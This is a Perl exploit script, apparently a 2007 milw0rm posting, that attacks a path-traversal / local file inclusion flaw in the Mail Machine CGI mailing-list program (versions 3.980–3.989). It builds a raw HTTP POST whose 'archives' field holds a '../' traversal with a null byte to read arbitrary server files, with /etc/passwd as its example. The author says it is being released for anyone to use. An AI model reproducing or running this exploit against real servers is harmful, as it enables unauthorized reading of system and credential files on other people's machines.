#!/usr/bin/perl -w

#__________________________________________________________________________

# [*] Mail Machine Local File Include Exploit
# [*] Vuln. v3.980, v3.985, v3.987, v3.988 and v3.989
# __________________________________________________________________________

# [!] Application homepage :   http://www.mikesworld.net/mailmachine.shtml
# [!] Author               :   H4 / Team XPK
# [!] Contact              :   H4_XPK@hotmail.com

# ---------------------------------------------------------------------

# Vuln. code:

# In mailmachine.cgi sub load { ...

# open() function is not properly sanitized against user supplied input

# ---------------------------------------------------------------------

# [!] This information got leaked long time ago, therefore we think that
#     everyone should have this information :)

# [!] Greetz to Angeldust & Narcotics and Streets and to rest of community.

use strict;
use IO::Socket;

if(@ARGV<1) { &Usage; exit(0); }

my $host = 'h4x0red.com';
my $port = 80;
my $path = '/cgi-bin/mail/mailmachine.cgi';
my $file = "$ARGV[0]";

sub Header()
{
 print "*=====================================================================*\n";
 print "    ----------------------------------------------------------------\n";
 print "                  Mail Machine File Disclosure Exploit\n";
 print "    ----------------------------------------------------------------\n";
 print "*=====================================================================*\n";
 print "                             Coded by H4\n\n";
}

Header();

print "[*] Attacking $host ..\n\n";

my $sock = IO::Socket::INET->new( PeerAddr => $host, PeerPort => $port, Proto => 'tcp' ) || die "[!] Unable to connect to $host\n";
my $post = "action=Load&archives=../../../../../../../../..$file%00";

my $send = "POST $path HTTP/1.1\r\n";
$send .= "Host: $host\r\n";
$send .= "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.4) Gecko/20070515 Firefox/2.0.0.4\r\n";
$send .= "Accept: text/html\r\n";
$send .= "Connection: Keep-Alive\r\n";
$send .= "Content-type: application/x-www-form-urlencoded\r\n";
$send .= "Content-length: ".length($post)."\r\n\r\n";
$send .= "$post\r\n\r\n";

print $sock $send;

while ( my $line = <$sock> ) {
print "$line";
}

close($sock);

sub Usage()
 {
  Header();
  print "Usage : mailmachine3.pl filename\n";
  print "------> mailmachine3.pl /etc/passwd\n";
  print "Do not forget edit host/path/port..\n";
}

# milw0rm.com [2007-07-10]
